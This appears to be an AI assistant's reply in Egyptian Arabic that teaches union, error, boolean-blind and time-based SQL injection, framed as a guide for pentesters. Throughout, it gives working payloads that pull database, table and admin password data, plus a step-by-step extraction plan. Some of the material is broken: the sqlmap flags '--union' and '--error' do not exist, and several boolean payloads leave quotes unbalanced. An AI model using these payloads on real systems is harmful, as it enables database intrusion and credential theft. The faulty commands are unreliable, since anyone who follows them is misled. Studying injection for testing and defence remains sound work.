# **1. Union-Based SQL Injection**
#### **إيه هو؟**
دا نوع بيستخدم أمر `UNION` في SQL عشان يربط بين نتايج استعلام عادي واستعلام إنت بتعمله عشان تسحب بيانات زيادة من الداتابيز.

#### **ازاي بيشتغل؟**
لازم تعرف عدد الأعمدة في الاستعلام الأصلي، وبعدين تستخدم `UNION` عشان تضيف استعلامك. لو الموقع بيظهر النتايج، هتقدر تسحب بيانات مباشرة.

#### **مثال عملي:**
1. **اختبار عدد الأعمدة:**
   ```
   ' ORDER BY 1 --
   ' ORDER BY 2 --
   ' ORDER BY 3 --
   ```
   لو الصفحة اشتغلت عند `ORDER BY 2` ورمت خطأ عند `3`، يبقى في عمودين.

2. **اختبار الثغرة:**
   ```
   ' UNION SELECT 1, 2 --
   ```
   لو ظهرت "1" و "2" في الصفحة، يبقى UNION شغال.

3. **سحب بيانات:**
   - اسم الداتابيز:
     ```
     ' UNION SELECT 1, database() --
     ```
   - أسماء الجداول:
     ```
     ' UNION SELECT 1, table_name FROM information_schema.tables --
     ```
   - بيانات اليوزرز:
     ```
     ' UNION SELECT 1, CONCAT(username, ':', password) FROM users --
     ```

#### **خلاصة طريفة:**
تخيل إنك في مطعم بتقول للجرسون "هاتلي الأكل بتاعي وكمان الأكل بتاع الطاولة التانية عشان أنا جعان"، لو الجرسون سمع الكلام وجابلك كل حاجة، يبقى لقيت الكنز بتاع الداتابيز!

---

### **2. Error-Based SQL Injection**
#### **إيه هو؟**
النوع ده بيعتمد على استغلال رسايل الخطأ اللي الداتابيز بترجعها لما تحصل مشكلة في الاستعلام. الموقع لو مش متأمن كويس، هيظهرلك الخطأ ومعاه معلومات زي اسم الداتابيز أو الجداول.

#### **ازاي بيشتغل؟**
بتعمل استعلام غلط متعمد عشان تخلي الداتابيز ترمي خطأ يكشف بيانات.

#### **مثال عملي:**
1. **اختبار الثغرة:**
   ```
   ' AND EXTRACTVALUE(1, CONCAT(0x3a, database())) --
   ```
   لو ظهر خطأ زي: `XPATH syntax error: ':mysql'`, يبقى اسم الداتابيز `mysql`.

2. **سحب اسم جدول:**
   ```
   ' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT table_name FROM information_schema.tables LIMIT 0,1))) --
   ```
   لو الخطأ رجع اسم جدول زي `users`، يبقى تمام.

#### **نصيحة:**
الـ `0x3a` دي عبارة عن رمز للـ `:` في Hex، بتستخدمها عشان تفرق بين الخطأ والبيانات.

#### **خلاصة طريفة:**
تخيل إنك بتزعق لصاحبك "قوللي سرك غلط عشان أعرف هو إيه!"، لو هو رد وقال "ما اقدرش أقول السر: فلوسي في البنك"، يبقى كده عرفت السر من غير ما يقصد!

---

### **3. Blind SQL Injection (Boolean-Based)**
#### **إيه هو؟**
النوع ده بيحصل لما الموقع مش بيظهر نتايج أو أخطاء مباشرة، فبتسأل الداتابيز أسئلة "صح أو غلط" (True/False) وبتعرف الإجابة من رد الصفحة.

#### **ازاي بيشتغل؟**
بتستخدم شروط زي `AND` أو `SUBSTRING` عشان تستنتج البيانات حرف بحرف.

#### **مثال عملي:**
1. **اختبار الثغرة:**
   ```
   ' AND 1=1 --
   ```
   لو الصفحة ردت عادي، يبقى True وفي ثغرة.

2. **استخراج اسم الداتابيز حرف بحرف:**
   ```
   ' AND SUBSTRING((SELECT database()), 1, 1) = 'm --
   ```
   لو الصفحة ردت True (يعني ظهرت زي ما هي)، يبقى الحرف الأول `m`. جرب `2, 1` للحرف التاني وهكذا.

3. **سحب بيانات:**
   ```
   ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'p --
   ```
   كده بتجمع الباسوورد حرف بحرف.

#### **خلاصة طريفة:**
تخيل إنك بتلعب لعبة "حار وبارد" مع واحد، بتقوله "الفلوس في الدولاب؟"، لو قال "آه" يبقى صح، لو سكت يبقى لأ، وكده تعرف مكان الفلوس خطوة بخطوة!

---

### **4. Time-Based SQL Injection**
#### **إيه هو؟**
زي Blind بس بيعتمد على الوقت. لو الموقع مش بيرد بنتايج أو أخطاء، بتخلي الداتابيز تتأخر في الرد لو الشرط صح.

#### **ازاي بيشتغل؟**
بتستخدم أوامر زي `SLEEP` أو `WAITFOR`، وبتقيس وقت الاستجابة.

#### **مثال عملي:**
1. **اختبار الثغرة:**
   ```
   ' OR IF(1=1, SLEEP(5), 0) --
   ```
   لو الصفحة استنيت 5 ثواني، يبقى الثغرة شغالة.

2. **استخراج حرف بحرف:**
   ```
   ' OR IF(SUBSTRING((SELECT database()), 1, 1) = 'm', SLEEP(5), 0) --
   ```
   لو تأخرت 5 ثواني، يبقى الحرف الأول `m`.

3. **سحب بيانات:**
   ```
   ' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0) --
   ```
   كده بتعرف الباسوورد بالتأخير.

#### **خلاصة طريفة:**
تخيل إنك بتسأل واحد "لو الفلوس معاك استنى 5 ثواني قبل ما ترد"، لو سكت 5 ثواني يبقى الفلوس معاه، لو رد على طول يبقى معاهوش، وكده بتعرف الحقيقة من غير ما ينطق!

---

### **خطوات عملية للاستغلال كـ Pentester**
دلوقتي خطة شاملة لكل نوع:

#### **Union-Based:**
1. اختبر عدد الأعمدة بـ `ORDER BY`.
2. جرب `UNION SELECT 1, 2, 3` حسب عدد الأعمدة.
3. اسحب الداتابيز بـ `database()`.
4. اسحب الجداول من `information_schema.tables`.
5. اسحب البيانات زي `username` و `password`.

#### **Error-Based:**
1. جرب أمر خطأ زي `' AND EXTRACTVALUE(1, CONCAT(0x3a, database())) --`.
2. لو ظهر خطأ مع بيانات، دوّنها.
3. كرر مع جداول أو أعمدة زي `table_name` أو `column_name`.

#### **Blind (Boolean-Based):**
1. اختبر بـ `' AND 1=1 --` و `' AND 1=2 --` للتأكد من الفرق.
2. استخدم `SUBSTRING` عشان تسحب حرف بحرف.
3. دوّن كل حرف لتكوين البيانات.

#### **Time-Based:**
1. اختبر بـ `' OR IF(1=1, SLEEP(5), 0) --`.
2. لو تأخرت، استخدم `SLEEP` مع `SUBSTRING` لسحب البيانات.
3. قيس التأخير لكل حرف وكون النص.

#### **نصيحة:**
استخدم **sqlmap** لكل نوع:
- Union: `sqlmap -u "URL" --union`
- Error: `sqlmap -u "URL" --error`
- Blind/Time: `sqlmap -u "URL" --technique=BT`

---

ها، عايز أعمق أكتر في نوع معين أو أشرح حاجة زي sqlmap بالتفصيل؟